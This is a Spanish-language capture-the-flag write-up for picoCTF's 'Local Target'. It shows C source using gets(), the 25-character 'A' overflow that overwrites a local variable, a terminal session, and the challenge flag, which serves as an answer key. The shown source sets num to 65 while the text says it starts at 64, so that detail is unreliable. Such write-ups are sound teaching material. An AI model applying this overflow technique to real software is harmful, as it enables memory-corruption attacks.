
# Local Target

## Descripcion
Smash the stackCan you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/517/local-target). You can view source [here](https://artifacts.picoctf.net/c/517/local-target.c). And connect with it using:`nc saturn.picoctf.net 57408`
## Pistas
1. Do anything you can to change `num`.
2. When you change `num`, view the value as hexadecimal.
## Solucion
La pista es que tenemos que cambiar el valor de num. Se nos da un codigo binario y uno fuente:
```python
#include <stdio.h>
#include <stdlib.h>



int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 65;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}

```
En el codigo vemos que esta buscando que la variable num sea igual a 65 pero por defaul es igual a 64.
Al correr el codigo nos pide un string el cual lo convierte en un char. esto se consigue con un gets() el cual puede ser desbordado. 

Al desbordarlo me di cuenta que el limite estaba masomenos entre 20-40. segui intentando hasta hallar que el error de segmentacion estaba exactamente en el 25. entonces al saber esto le inyecte 25 caracteres de tipo a. lo cual cambio el num al 97. lo cual es codigo ascii para la letra a. Ocupabamos que el num fuera de valor 65 entonces busque el valor de 65 en el ASCII lo cual me dio la letra 'A'. le inyecte 25 A y me dio la bandera. 
```bash()
┌──(kali㉿kali)-[~]
└─$ nc saturn.picoctf.net 52661        
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```
## Bandera

picoCTF{l0c4l5_1n_5c0p3_fee8ef05}

## Notas adicionales

| comando | descripcion |
| --- | --- |

## Referencias
